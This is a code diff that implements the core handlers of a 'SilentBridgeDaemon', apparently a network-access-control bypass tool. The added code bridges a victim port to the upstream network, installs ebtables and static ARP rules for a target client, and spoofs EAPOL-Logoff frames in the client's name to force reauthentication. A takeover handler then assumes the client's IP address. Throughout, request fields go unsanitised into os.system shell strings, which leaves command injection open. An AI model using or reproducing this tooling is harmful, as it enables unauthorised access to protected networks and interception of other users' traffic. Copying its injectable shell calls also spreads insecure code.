@@ -358,11 +358,42 @@ class SilentBridgeDaemon:
                          status=StatusCode.BRIDGE_EXISTS,
                          data={'error': 'Bridge already exists'})
         
-        # Implementation of create_bridge logic here
-        # This will be similar to the original create_transparent_bridge method
-        # but adapted for the daemon architecture
-        
-        return Message(CommandType.CREATE_BRIDGE)
+        try:
+            bridge_name = data.get('bridge_name', 'br0')
+            phy_interface = data.get('phy_interface')
+            upstream_interface = data.get('upstream_interface')
+            
+            if not all([phy_interface, upstream_interface]):
+                return Message(CommandType.CREATE_BRIDGE,
+                             status=StatusCode.ERROR,
+                             data={'error': 'Missing required parameters'})
+            
+            # Create bridge interface
+            os.system(f"ip link add name {bridge_name} type bridge")
+            os.system(f"ip link set {bridge_name} up")
+            
+            # Add interfaces to bridge
+            os.system(f"ip link set {phy_interface} up")
+            os.system(f"ip link set {upstream_interface} up")
+            os.system(f"ip link set {phy_interface} master {bridge_name}")
+            os.system(f"ip link set {upstream_interface} master {bridge_name}")
+            
+            # Update config
+            self.config.update({
+                'bridge_name': bridge_name,
+                'phy_interface': phy_interface,
+                'upstream_interface': upstream_interface
+            })
+            save_config(self.config)
+            
+            self.bridge_status = BridgeStatus.CREATED
+            return Message(CommandType.CREATE_BRIDGE)
+            
+        except Exception as e:
+            logging.error(f"Error creating bridge: {e}")
+            return Message(CommandType.CREATE_BRIDGE,
+                         status=StatusCode.ERROR,
+                         data={'error': str(e)})
     
     def handle_destroy_bridge(self, data):
         """Handle DESTROY_BRIDGE command"""
@@ -371,9 +402,31 @@ class SilentBridgeDaemon:
                          status=StatusCode.BRIDGE_DOES_NOT_EXIST,
                          data={'error': 'Bridge does not exist'})
         
-        # Implementation of destroy_bridge logic here
-        
-        return Message(CommandType.DESTROY_BRIDGE)
+        try:
+            bridge_name = data.get('bridge_name', self.config.get('bridge_name'))
+            if not bridge_name:
+                return Message(CommandType.DESTROY_BRIDGE,
+                             status=StatusCode.ERROR,
+                             data={'error': 'Bridge name not specified'})
+            
+            # Remove interfaces from bridge
+            if self.config.get('phy_interface'):
+                os.system(f"ip link set {self.config['phy_interface']} nomaster")
+            if self.config.get('upstream_interface'):
+                os.system(f"ip link set {self.config['upstream_interface']} nomaster")
+            
+            # Delete bridge interface
+            os.system(f"ip link set {bridge_name} down")
+            os.system(f"ip link delete {bridge_name} type bridge")
+            
+            self.bridge_status = BridgeStatus.NOT_CREATED
+            return Message(CommandType.DESTROY_BRIDGE)
+            
+        except Exception as e:
+            logging.error(f"Error destroying bridge: {e}")
+            return Message(CommandType.DESTROY_BRIDGE,
+                         status=StatusCode.ERROR,
+                         data={'error': str(e)})
     
     def handle_add_interaction(self, data):
         """Handle ADD_INTERACTION command"""
@@ -382,14 +435,60 @@ class SilentBridgeDaemon:
                          status=StatusCode.ERROR,
                          data={'error': 'Bridge not in correct state'})
         
-        # Implementation of add_interaction logic here
-        
-        return Message(CommandType.ADD_INTERACTION)
+        try:
+            bridge = data.get('bridge')
+            phy = data.get('phy')
+            client_mac = data.get('client_mac')
+            client_ip = data.get('client_ip')
+            gw_mac = data.get('gw_mac')
+            
+            if not all([bridge, phy, client_mac, client_ip, gw_mac]):
+                return Message(CommandType.ADD_INTERACTION,
+                             status=StatusCode.ERROR,
+                             data={'error': 'Missing required parameters'})
+            
+            # Add interaction rules
+            os.system(f"ebtables -A FORWARD -i {phy} -s {client_mac} -j ACCEPT")
+            os.system(f"ebtables -A FORWARD -o {phy} -d {client_mac} -j ACCEPT")
+            os.system(f"arp -i {bridge} -s {client_ip} {client_mac}")
+            os.system(f"arp -i {bridge} -s {self.config.get('gateway_ip')} {gw_mac}")
+            
+            self.clients.append({
+                'mac': client_mac,
+                'ip': client_ip,
+                'interface': phy
+            })
+            
+            return Message(CommandType.ADD_INTERACTION)
+            
+        except Exception as e:
+            logging.error(f"Error adding interaction: {e}")
+            return Message(CommandType.ADD_INTERACTION,
+                         status=StatusCode.ERROR,
+                         data={'error': str(e)})
     
     def handle_force_reauth(self, data):
         """Handle FORCE_REAUTH command"""
-        # Implementation of force_reauth logic here
-        return Message(CommandType.FORCE_REAUTH)
+        try:
+            interface = data.get('interface')
+            client_mac = data.get('client_mac')
+            
+            if not all([interface, client_mac]):
+                return Message(CommandType.FORCE_REAUTH,
+                             status=StatusCode.ERROR,
+                             data={'error': 'Missing required parameters'})
+            
+            # Send EAPOL-Logoff
+            logoff_packet = Ether(src=client_mac)/EAPOL(type=2)
+            sendp(logoff_packet, iface=interface, verbose=False)
+            
+            return Message(CommandType.FORCE_REAUTH)
+            
+        except Exception as e:
+            logging.error(f"Error forcing reauthentication: {e}")
+            return Message(CommandType.FORCE_REAUTH,
+                         status=StatusCode.ERROR,
+                         data={'error': str(e)})
     
     def handle_takeover_client(self, data):
         """Handle TAKEOVER_CLIENT command"""
@@ -398,9 +497,41 @@ class SilentBridgeDaemon:
                          status=StatusCode.ERROR,
                          data={'error': 'Bridge not in correct state'})
         
-        # Implementation of takeover_client logic here
-        
-        return Message(CommandType.TAKEOVER_CLIENT)
+        try:
+            bridge = data.get('bridge')
+            phy = data.get('phy')
+            client_mac = data.get('client_mac')
+            client_ip = data.get('client_ip')
+            gateway_ip = data.get('gateway_ip')
+            netmask = data.get('netmask', '255.255.255.0')
+            veth = data.get('veth')
+            
+            if not all([bridge, phy, client_mac, client_ip, gateway_ip]):
+                return Message(CommandType.TAKEOVER_CLIENT,
+                             status=StatusCode.ERROR,
+                             data={'error': 'Missing required parameters'})
+            
+            # Create veth pair if specified
+            if veth:
+                os.system(f"ip link add {veth} type veth peer name {veth}_peer")
+                os.system(f"ip link set {veth} up")
+                os.system(f"ip link set {veth}_peer up")
+                os.system(f"ip link set {veth} master {bridge}")
+            
+            # Configure IP addressing
+            os.system(f"ip addr add {client_ip}/{netmask} dev {bridge}")
+            os.system(f"ip route add {gateway_ip} dev {bridge}")
+            
+            # Update ARP
+            os.system(f"arp -i {bridge} -s {gateway_ip} {self.config.get('router_mac')}")
+            
+            return Message(CommandType.TAKEOVER_CLIENT)
+            
+        except Exception as e:
+            logging.error(f"Error in client takeover: {e}")
+            return Message(CommandType.TAKEOVER_CLIENT,
+                         status=StatusCode.ERROR,
+                         data={'error': str(e)})
     
     def handle_start_analysis(self, data):
         """Handle START_ANALYSIS command"""
